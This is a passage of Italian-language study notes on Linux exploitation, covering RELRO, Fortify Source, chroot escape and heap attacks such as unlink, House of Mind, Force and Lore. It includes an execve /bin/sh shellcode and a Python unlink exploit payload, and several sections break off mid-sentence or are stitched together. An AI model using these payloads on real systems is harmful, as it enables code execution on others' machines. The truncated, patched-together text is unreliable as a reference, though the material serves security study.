Se si utilizza la funzione execve() dopo fork(), lo spazio viene sovrascritto e l'attacco non √® pi√π possibile. vfork() consente di eseguire il processo figlio senza creare una duplicazione fino a quando il processo figlio tenta
### Relro

**Relro (Read only Relocation)** influisce sulle autorizzazioni di memoria in modo simile a NX. La differenza √® che mentre con NX rende lo stack eseguibile, RELRO rende **alcune cose in sola lettura** in modo che non possiamo scriverci. Il modo pi√π comune in cui ho visto che questo √® un ostacolo √® impedirci di fare una **sovrascrittura della tabella `got`**, che verr√† trattata in seguito. La tabella `got` contiene gli indirizzi delle funzioni libc in modo che il binario sappia quali sono gli indirizzi e possa chiamarli. Vediamo come sono le autorizzazioni di memoria per una voce della tabella `got` per un binario con e senza relro.

Con relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Senza relro:

Quando un eseguibile √® compilato senza la protezione relro (Relocation Read-Only), l'indirizzo base delle librerie condivise non viene casuale. Ci√≤ significa che un attaccante pu√≤ sfruttare questa vulnerabilit√† per sovrascrivere i puntatori delle funzioni delle librerie condivise e ottenere l'esecuzione di codice arbitrario. Questo tipo di attacco √® noto come attacco di sovrascrittura del puntatore della funzione (Function Pointer Overwrite).
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Per il binario **senza relro**, possiamo vedere che l'indirizzo dell'entry `got` per `fgets` √® `0x404018`. Osservando i mapping di memoria, vediamo che si trova tra `0x404000` e `0x405000`, che hanno le **autorizzazioni `rw`**, il che significa che possiamo leggere e scrivere su di esso. Per il binario **con relro**, vediamo che l'indirizzo della tabella `got` per l'esecuzione del binario (pie √® abilitato quindi questo indirizzo cambier√†) √® `0x555555557fd0`. Nel mapping di memoria di quel binario si trova tra `0x0000555555557000` e `0x0000555555558000`, che ha l'autorizzazione di memoria **`r`**, il che significa che possiamo solo leggere da esso.

Quindi qual √® il **bypass**? Il bypass tipico che uso √® semplicemente non scrivere nelle regioni di memoria che relro rende di sola lettura e **trovare un modo diverso per ottenere l'esecuzione del codice**.

Si noti che affinch√© ci√≤ accada, il binario deve conoscere in precedenza gli indirizzi delle funzioni:

* Binding lazy: L'indirizzo di una funzione viene cercato la prima volta che la funzione viene chiamata. Quindi, la `got` deve avere le autorizzazioni di scrittura durante l'esecuzione.
* Binding now: Gli indirizzi delle funzioni vengono risolti all'inizio dell'esecuzione, quindi vengono fornite autorizzazioni di sola lettura a sezioni sensibili come .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Per verificare se un programma utilizza Binding now, √® possibile eseguire:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Quando il binario viene caricato in memoria e una funzione viene chiamata per la prima volta, viene saltato alla PLT (Procedure Linkage Table), da qui viene eseguito un salto (jmp) alla GOT e si scopre che quella voce non √® stata risolta (contiene un indirizzo successivo alla PLT). Quindi viene invocato il Runtime Linker o rtfd per risolvere l'indirizzo e salvarlo nella GOT.

Quando viene chiamata una funzione, viene chiamata la PLT, che ha l'indirizzo della GOT in cui √® memorizzato l'indirizzo della funzione, quindi reindirizza il flusso l√¨ e la funzione viene chiamata. Tuttavia, se √® la prima volta che viene chiamata la funzione, ci√≤ che √® nella GOT √® l'istruzione successiva alla PLT, quindi il flusso segue il codice della PLT (rtfd) e scopre l'indirizzo della funzione, lo salva nella GOT e lo chiama.

Quando un binario viene caricato in memoria, il compilatore gli ha detto a quale offset posizionare i dati che devono essere caricati quando il programma viene eseguito.

Lazy binding -> L'indirizzo della funzione viene cercato la prima volta che viene invocata quella funzione, quindi la GOT ha i permessi di scrittura in modo che quando viene cercata, venga salvata l√¨ e non sia necessario cercarla nuovamente.

Bind now -> Gli indirizzi delle funzioni vengono cercati durante il caricamento del programma e i permessi delle sezioni .got, .dtors, .ctors, .dynamic, .jcr vengono cambiati in sola lettura. -z relro e -z now

Nonostante ci√≤, in generale i programmi non sono complicati con queste opzioni, quindi questi attacchi rimangono possibili.

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> Per sapere se viene utilizzato il BIND NOW

Fortify Source -D_FORTIFY_SOURCE=1 o =2

Cerca di identificare le funzioni che copiano da un luogo all'altro in modo insicuro e sostituisci la funzione con una funzione sicura.

Ad esempio:
char buf[16];
strcpy(buf, source);

Viene identificato come insicuro e quindi strcpy() viene sostituito da __strcpy_chk() utilizzando la dimensione del buffer come dimensione massima da copiare.

La differenza tra =1 o =2 √® che:

La seconda non consente che %n provenga da una sezione con permessi di scrittura. Inoltre, il parametro per l'accesso diretto agli argomenti pu√≤ essere utilizzato solo se vengono utilizzati quelli precedenti, ovvero pu√≤ essere utilizzato solo %3$d se prima √® stato utilizzato %2$d e %1$d

Per mostrare il messaggio di errore viene utilizzato argv[0], quindi se viene inserito l'indirizzo di un altro luogo (come una variabile globale) il messaggio di errore mostrer√† il contenuto di tale variabile. Pag 191

Sostituzione di Libsafe

Viene attivato con: LD_PRELOAD=/lib/libsafe.so.2
o
"/lib/libsave.so.2" > /etc/ld.so.preload

Vengono intercettate le chiamate a alcune funzioni insicure con altre sicure. Non √® standardizzato. (solo per x86, non per compilazioni con -fomit-frame-pointer, non compilazioni statiche, non tutte le funzioni vulnerabili diventano sicure e LD_PRELOAD non funziona con binari con suid).

ASCII Armored Address Space

Consiste nel caricare le librerie condivise da 0x00000000 a 0x00ffffff in modo che ci sia sempre un byte 0x00. Tuttavia, questo non ferma praticamente nessun attacco, soprattutto in little endian.

ret2plt

Consiste nell'eseguire un ROP in modo che venga chiamata la funzione strcpy@plt (dalla plt) e si punti all'ingresso della GOT e si copi il primo byte della funzione a cui si vuole chiamare (system()). Successivamente si fa lo stesso puntando a GOT+1 e si copia il secondo byte di system()... Alla fine viene chiamato l'indirizzo salvato nella GOT che sar√† system()

Falso EBP

Per le funzioni che utilizzano EBP come registro per puntare agli argomenti, modificando l'EIP e puntando a system(), √® necessario aver modificato anche l'EBP in modo che punti a una zona di memoria che abbia 2 byte qualsiasi e quindi l'indirizzo di &"/bin/sh".

Gabbie con chroot()

debootstrap -arch=i386 hardy /home/user -> Installa un sistema di base in una specifica sottodirectory

Un amministratore pu√≤ uscire da una di queste gabbie facendo: mkdir foo; chroot foo; cd ..

Strumentazione del codice

Valgrind -> Cerca errori
Memcheck
RAD (Return Address Defender)
Insure++

8 Heap Overflows: Exploits di base

Chunk assegnato

prev_size |
size | -Intestazione
*mem | Dati

Chunk libero

prev_size |
size |
*fd | Ptr avanti al chunk
*bk | Ptr indietro al chunk -Intestazione
*mem | Dati

I chunk liberi sono in una lista doppiamente collegata (bin) e non possono mai esserci due chunk liberi consecutivi (vengono uniti)

In "size" ci sono bit per indicare: se il chunk precedente √® in uso, se il chunk √® stato assegnato tramite mmap() e se il chunk appartiene all'arena primaria.

Se viene liberato un chunk e uno dei chunk adiacenti √® libero, vengono fusi tramite la macro unlink() e il nuovo chunk pi√π grande viene passato a frontlink() per inserirlo nel bin corretto.

unlink(){
BK = P->bk; -> Il BK del nuovo chunk √® quello che aveva il chunk precedentemente libero
FD = P->fd; -> Il FD del nuovo chunk √® quello che aveva il chunk precedentemente libero
FD->bk = BK; -> Il BK del chunk successivo punta al nuovo chunk
BK->fd = FD; -> Il FD del chunk precedente punta al nuovo chunk
}

Quindi, se riusciamo a modificare P->bk con l'indirizzo di uno shellcode e P->fd con l'indirizzo di una voce nella GOT o DTORS meno 12, si ottiene:

BK = P->bk = &shellcode
FD = P->fd = &__dtor_end__ - 12
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

E cos√¨, quando il programma termina, viene eseguito lo shellcode.

Inoltre, la quarta istruzione di unlink() scrive qualcosa e lo shellcode deve essere riparato per questo:

BK->fd = FD -> *((&shellcode + 8) = (&__dtor_end__ - 12) -> Questo provoca la scrittura di 4 byte a partire dall'8¬∞ byte dello shellcode, quindi la prima istruzione dello shellcode deve essere un jmp per saltare questo e arrivare a dei nops che portano al resto dello shellcode.

Quindi l'exploit viene creato:

Nel buffer1 inseriamo lo shellcode iniziando con un jmp in modo che cada nei nops o nel resto dello shellcode.

Dopo lo shellcode inseriamo del padding fino a raggiungere il campo prev_size e size del chunk successivo. In questi punti inseriamo 0xfffffff0 (in modo che venga sovrascritto il prev_size per avere il bit che indica che √® libero) e "-4" (0xfffffffc) nel size (in modo che quando viene controllato nel terzo chunk se il secondo era libero, in realt√† va al prev_size modificato che gli dir√† che √® libero) -> In questo modo quando free() viene chiamato, andr√† al size del terzo ma in realt√† andr√† al secondo - 4 e penser√† che il secondo chunk sia libero. E quindi chiamer√† unlink().

Chiamando unlink() user√† come P->fd i primi dati del secondo chunk, quindi l√¨ verr√† inserito l'indirizzo da sovrascrivere - 12 (po
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #√à importante che il bit che indica che il chunk precedente √® libero sia impostato a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, in modo che il "size" del terzo chunk sia 4 byte indietro (punta a prev\_size) dove controlla se il secondo chunk √® libero**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Nel payload all'inizio mettiamo 8 byte di riempimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Indirizzo di free() nella plt-12 (sar√† sovrascritto per far eseguire lo shellcode la seconda volta che viene chiamato free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Come detto, il payload inizia con 8 byte di riempimento solo perch√© s√¨**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifichiamo il secondo chunk, got\_free punta all'indirizzo in cui salveremo l'indirizzo di addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando in senso inverso (wargame)**

Stiamo controllando 3 chunk consecutivi e vengono liberati in ordine inverso rispetto alla loro allocazione.

In questo caso:

Nel chunk c viene inserito lo shellcode.

Il chunk a viene utilizzato per sovrascrivere il campo b in modo che il bit PREV\_INUSE sia disattivato, facendo credere che il chunk a sia libero.

Inoltre, viene sovrascritta l'intestazione b con il valore -4 per il campo size.

Quindi, il programma penser√† che "a" sia libero e in un bin, quindi chiamer√† unlink() per disconnetterlo. Tuttavia, poich√© l'intestazione PREV\_SIZE vale -4, penser√† che il chunk "a" inizi effettivamente da b+4. In altre parole, eseguir√† unlink() su un chunk che inizia da b+4, quindi b+12 conterr√† il puntatore "fd" e b+16 conterr√† il puntatore "bk".

In questo modo, se mettiamo l'indirizzo dello shellcode in bk e l'indirizzo della funzione "puts()" -12 in fd, otteniamo il nostro payload.

**Tecnica di Frontlink**

Viene chiamato frontlink quando viene liberato un chunk e nessuno dei chunk adiacenti √® libero, quindi non viene chiamato unlink(), ma viene chiamato direttamente frontlink().

Vulnerabilit√† utile quando il malloc attaccato non viene mai liberato (free()).

Richiede:

Un buffer che pu√≤ essere sovrascritto con la funzione di input dei dati.

Un buffer adiacente a questo che deve essere liberato e il cui campo fd dell'intestazione verr√† modificato grazie allo sforamento del buffer precedente.

Un buffer da liberare con una dimensione maggiore di 512 ma inferiore al buffer precedente.

Un buffer dichiarato prima del passaggio 3 che consente di sovrascrivere il prev\_size di questo.

In questo modo, sovrascrivendo in modo incontrollato due malloc e in modo controllato solo uno che viene liberato, possiamo fare un exploit.

**Vulnerabilit√† double free()**

Se free() viene chiamato due volte con lo stesso puntatore, vengono creati due bin che puntano allo stesso indirizzo.

Se si desidera riutilizzare uno, verr√† assegnato senza problemi. Se si desidera utilizzare un altro, verr√† assegnato lo stesso spazio, quindi avremo i puntatori "fd" e "bk" falsificati con i dati scritti dalla precedente allocazione.

**After free()**

Un puntatore precedentemente liberato viene riutilizzato senza controllo.

## **8 Heap Overflows: Exploits avanzados**

Le tecniche di Unlink() e FrontLink() sono state eliminate modificando la funzione unlink().

**The house of mind**

√à necessaria solo una chiamata a free() per eseguire codice arbitrario. √à interessante trovare un secondo chunk che pu√≤ essere sovrascritto da uno precedente e liberato.

Una chiamata a free() chiama public\_fREe(mem), che fa:

mstate ar\_ptr;

mchunkptr p;

...

p = mem2chunk(mes); ‚Äî> Restituisce un puntatore all'indirizzo in cui inizia il chunk (mem-8)

...

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

...

\_int\_free(ar\_ptr, mem);

}

In \[1] viene controllato il campo size del bit NON\_MAIN\_ARENA, che pu√≤ essere modificato in modo che il controllo restituisca true ed esegua heap\_for\_ptr(), che fa un and a "mem" impostando a 0 gli ultimi 2,5 byte meno significativi (nel nostro caso da 0x0804a000 a 0x08000000) e accede a 0x08000000->ar\_ptr (come se fosse una struttura heap\_info).

In questo modo, se possiamo controllare un chunk ad esempio in 0x0804a000 e un chunk viene liberato in **0x081002a0**, possiamo raggiungere l'indirizzo 0x08100000 e scrivere ci√≤ che vogliamo, ad esempio **0x0804a000**. Quando questo secondo chunk viene liberato, trover√† che heap\_for\_ptr(ptr)->ar\_ptr restituisce ci√≤ che abbiamo scritto in 0x08100000 (poich√© viene applicato l'and a 0x081002a0 che abbiamo visto prima e da l√¨ viene estratto il valore dei primi 4 byte, l'ar\_ptr)

In questo modo viene chiamato \_int\_free(ar\_ptr, mem), cio√® **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
...\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Come abbiamo visto prima, possiamo controllare il valore di av, poich√© √® ci√≤ che scriviamo nel chunk che verr√† liberato.

Come viene definito unsorted\_chunks, sappiamo che:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Quindi, se scriviamo il valore di \_\_DTOR\_END\_\_-12 in av->bins\[2], nell'ultima istruzione verr√† scritto in \_\_DTOR\_END\_\_ l'indirizzo del secondo chunk.

In altre parole, nel primo chunk dobbiamo mettere all'inizio molte volte l'indirizzo di \_\_DTOR\_END\_\_-12 perch√© av->bins\[2] lo prender√† da l√¨.

Nell'indirizzo in cui cade l'indirizzo del secondo chunk con gli ultimi 5 zeri, dobbiamo scrivere l'indirizzo di questo primo chunk in modo che heap\_for\_ptr() pensi che ar\_ptr sia all'inizio del primo chunk e prenda av->bins\[2] da l√¨.

Nel secondo chunk e grazie al primo sovrascriviamo prev\_size con un jump 0x0c e size con qualcosa per attivare -> NON\_MAIN\_
Questa tecnica non √® pi√π applicabile poich√© √® stato applicato quasi lo stesso patch di unlink. Si confronta se il nuovo sito a cui si punta sta puntando anche a lui.

**Fastbin**

√à una variante di The house of mind

ci interessa eseguire il codice successivo, che viene raggiunto dopo il primo controllo della funzione \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Essendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

In questo modo, se viene messo in "fb" l'indirizzo di una funzione nella GOT, in questo indirizzo verr√† messo l'indirizzo del pezzo sovrascritto. Per fare ci√≤, √® necessario che l'arena sia vicina agli indirizzi di dtors. Pi√π precisamente, av->max\_fast deve essere all'indirizzo che stiamo sovrascrivendo.

Dato che con The House of Mind abbiamo visto che controlliamo la posizione di av.

Quindi, se nel campo size mettiamo una dimensione di 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ci restituir√† fastbins\[-1\], che punter√† a av->max\_fast

In questo caso, av->max\_fast sar√† l'indirizzo che viene sovrascritto (non a cui punta, ma quella posizione verr√† sovrascritta).

Inoltre, deve essere soddisfatta la condizione che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 8, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, la shellcode sar√† nel pezzo liberato, quindi dovremo mettere all'inizio un jmp che cada in nops).

Inoltre, lo stesso falso pezzo deve essere minore di av->system\_mem. av->system\_mem si trova 1848 byte pi√π avanti.

A causa dei null di \_DTOR\_END\_ e dei pochi indirizzi nella GOT, nessun indirizzo di queste sezioni serve per essere sovrascritto, quindi vediamo come applicare fastbin per attaccare lo stack.

Un altro modo di attacco √® di reindirizzare **av** verso lo stack.

Se modifichiamo la dimensione in modo che sia 16 invece di 8, allora: fastbin\_index() ci restituir√† fastbins\[0\] e possiamo usarlo per sovrascrivere lo stack.

Per fare ci√≤, non deve esserci alcun canary o valori strani nello stack, infatti dobbiamo trovarci in questo modo: 4 byte null + EBP + RET

I 4 byte null sono necessari perch√© **av** sar√† a questo indirizzo e il primo elemento di un **av** √® il mutex che deve valere 0.

**av->max\_fast** sar√† l'EBP e sar√† un valore che ci servir√† per saltare le restrizioni.

In **av->fastbins\[0\]** verr√† sovrascritto con l'indirizzo di **p** e sar√† il RET, in questo modo si salter√† alla shellcode.

Inoltre, in **av->system\_mem** (1484 byte sopra la posizione nello stack) ci sar√† abbastanza spazzatura che ci permetter√† di saltare il controllo che viene eseguito.

Inoltre, deve essere soddisfatta la condizione che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 16, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, la shellcode sar√† nel pezzo liberato, quindi dovremo mettere all'inizio un jmp che cada in nops che vanno dopo il campo size del nuovo falso pezzo).

**The House of Spirit**

In questo caso cerchiamo di avere un puntatore a un malloc che pu√≤ essere modificato dall'attaccante (ad esempio, il puntatore √® nello stack sotto un possibile overflow di una variabile).

In questo modo, potremmo fare in modo che questo puntatore punti ovunque. Tuttavia, non qualsiasi posizione √® valida, la dimensione del pezzo falso deve essere inferiore a av->max\_fast e pi√π specificamente uguale alla dimensione richiesta in una futura chiamata a malloc()+8. Pertanto, se sappiamo che dopo questo puntatore vulnerabile viene chiamato malloc(40), la dimensione del pezzo falso deve essere uguale a 48.

Ad esempio, se il programma chiede all'utente un numero, potremmo inserire 48 e puntare il puntatore di malloc modificabile ai successivi 4 byte (che potrebbero appartenere all'EBP con fortuna, in modo che il 48 sia dietro, come se fosse l'intestazione size). Inoltre, l'indirizzo ptr-4+48 deve soddisfare diverse condizioni (essendo in questo caso ptr=EBP), cio√®, 8 < ptr-4+48 < av->system\_mem.

Se ci√≤ viene soddisfatto, quando viene chiamato il successivo malloc che abbiamo detto che era malloc(40), verr√† assegnato come indirizzo l'indirizzo dell'EBP. Se l'attaccante pu√≤ anche controllare cosa viene scritto in questo malloc, pu√≤ sovrascrivere sia l'EBP che l'EIP con l'indirizzo desiderato.

Credo che ci√≤ sia perch√© quando viene liberato con free(), viene salvato che nell'indirizzo che punta all'EBP dello stack c'√® un pezzo di dimensioni perfette per il nuovo malloc() che si desidera allocare, quindi gli viene assegnato quell'indirizzo.

**The House of Force**

√à necessario:

* Un overflow a un pezzo che consenta di sovrascrivere il wilderness
* Una chiamata a malloc() con la dimensione definita dall'utente
* Una chiamata a malloc() i cui dati possono essere definiti dall'utente

La prima cosa che si fa √® sovrascrivere la dimensione del pezzo wilderness con un valore molto grande (0xffffffff), in modo che qualsiasi richiesta di memoria sufficientemente grande venga gestita in \_int\_malloc() senza la necessit√† di espandere l'heap

La seconda cosa √® alterare av->top in modo che punti a una zona di memoria sotto il controllo dell'attaccante, come lo stack. In av->top verr√† messo \&EIP - 8.

Dobbiamo sovrascrivere av->top in modo che punti alla zona di memoria sotto il controllo dell'attaccante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim prende il valore dell'indirizzo del pezzo wilderness attuale (l'attuale av->top) e remainder √® esattamente la somma di quell'indirizzo pi√π la quantit√† di byte richiesta da malloc(). Quindi, se \&EIP-8 √® a 0xbffff224 e av->top contiene 0x080c2788, allora la quantit√† che dobbiamo allocare nel malloc controllato affinch√© av->top punti a $EIP-8 per il prossimo malloc() sar√†:

0xbffff224 - 0x080c2788 = 3086207644.

In questo modo, il valore alterato verr√† salvato in av->top e il prossimo malloc punter√† all'EIP e potr√† sovrascriverlo.

√à importante sapere che la dimensione del nuovo pezzo wilderness sia pi√π grande della richiesta fatta dall'ultimo malloc(). Cio√®, se il wilderness sta puntando a \&EIP-8, la dimensione sar√† proprio nel campo EBP dello stack.

**The House of Lore**

**Corruzione SmallBin**

I pezzi liberati vengono inseriti nel bin in base alla loro dimensione. Ma prima di essere inseriti, vengono salvati in unsorted bins. Un pezzo liberato non viene immediatamente inserito nel suo bin, ma rimane in unsorted bins. Successivamente, se viene richiesto un nuovo pezzo e quello precedente liberato pu√≤ servire, viene rest
# Linux Exploiting: Basic ESP

In questo capitolo, esploreremo alcune tecniche di exploit di base per Linux, concentrandoci sull'uso di ESP (Extended Stack Pointer) per ottenere il controllo del flusso di esecuzione di un programma.

## Sfruttare l'overflow di heap

L'obiettivo di questa tecnica √® sfruttare un overflow di heap per modificare il puntatore `bk` di un chunk di memoria. Se riusciamo a modificare il puntatore `bk` in modo che punti a un indirizzo controllato dall'attaccante, possiamo ingannare il sistema di allocazione della memoria (bin) e far credere che il prossimo chunk disponibile si trovi all'indirizzo falso che abbiamo impostato. In questo modo, quando viene allocato un nuovo chunk e l'attaccante ha i permessi su di esso, verr√† restituito un chunk nella posizione desiderata e l'attaccante potr√† scriverci sopra.

Per eseguire questa vulnerabilit√†, √® necessario seguire i seguenti passaggi:

1. Riservare un chunk vulnerabile.
2. Riservare un chunk che verr√† modificato.
3. Liberare il secondo chunk.
4. Riservare un chunk pi√π grande del secondo chunk liberato.
5. Modificare il chunk vulnerabile (overflow) in modo che modifichi il puntatore `bk`.
6. Riservare un chunk delle stesse dimensioni del chunk vulnerabile.
7. Riservare un secondo chunk delle stesse dimensioni che punter√† all'indirizzo scelto dall'attaccante.

√à importante notare che dopo aver liberato il chunk modificato, √® necessario riservare un chunk pi√π grande di quello liberato in modo che il chunk modificato venga rimosso dalla lista degli "unsorted bins" e inserito nella sua "bin" corrispondente.

Per proteggere da questo attacco, viene solitamente utilizzato un controllo per verificare se il chunk non √® falso, ad esempio controllando se `bck->fd` punta a `victim`. Pertanto, per superare questa protezione, l'attaccante dovrebbe essere in grado di scrivere in qualche modo (probabilmente nello stack) l'indirizzo corretto di `victim`, in modo che sembri un chunk vero.

## Corruzione di LargeBin

Questa tecnica richiede gli stessi requisiti della tecnica precedente, ma richiede anche che i chunk riservati siano di dimensioni superiori a 512.

L'attacco √® simile a quello precedente, ovvero modificare il puntatore `bk` e richiede tutte le chiamate a `malloc()`, ma inoltre √® necessario modificare la dimensione del chunk modificato in modo che `size - nb` sia minore di `MINSIZE`. Ad esempio, √® possibile impostare la dimensione su 1552 in modo che `1552 - 1544 = 8 < MINSIZE` (la sottrazione non pu√≤ essere negativa perch√© viene confrontato un valore non firmato).

Inoltre, √® stato introdotto un patch per rendere l'attacco ancora pi√π complicato.

## Heap Spraying

Questa tecnica consiste essenzialmente nel riservare tutta la memoria possibile per gli heap e riempirli con un "colch√≥n" di `nops` seguito da una shellcode. Inoltre, come "colch√≥n" viene utilizzato `0x0c`. L'obiettivo √® saltare all'indirizzo `0x0c0c0c0c`, in modo che se viene sovrascritto un puntatore che punta a questo "colch√≥n", il flusso di esecuzione salti a quel punto. L'idea √® riservare il massimo possibile di memoria per vedere se viene sovrascritto qualche puntatore e saltare a `0x0c0c0c0c`, sperando che ci siano `nops` in quella posizione.

## Heap Feng Shui

Questa tecnica consiste nel seminare la memoria con riservazioni e liberazioni di chunk in modo che ci siano chunk riservati tra i chunk liberi. Il buffer da overflow verr√† posizionato in uno di questi "huevos".

## Comandi utili

- `objdump -d eseguibile` --> Disassembla le funzioni
- `objdump -d ./PROGRAMMA | grep FUNZIONE` --> Ottieni l'indirizzo della funzione
- `objdump -d -Mintel ./shellcodeout` --> Per verificare che sia effettivamente la nostra shellcode e ottenere gli OpCodes
- `objdump -t ./exec | grep varBss` --> Tabella dei simboli, per ottenere l'indirizzo delle variabili e delle funzioni
- `objdump -TR ./exec | grep exit(func lib)` --> Per ottenere l'indirizzo delle funzioni delle librerie (GOT)
- `objdump -d ./exec | grep funcCode`
- `objdump -s -j .dtors /exec`
- `objdump -s -j .got ./exec`
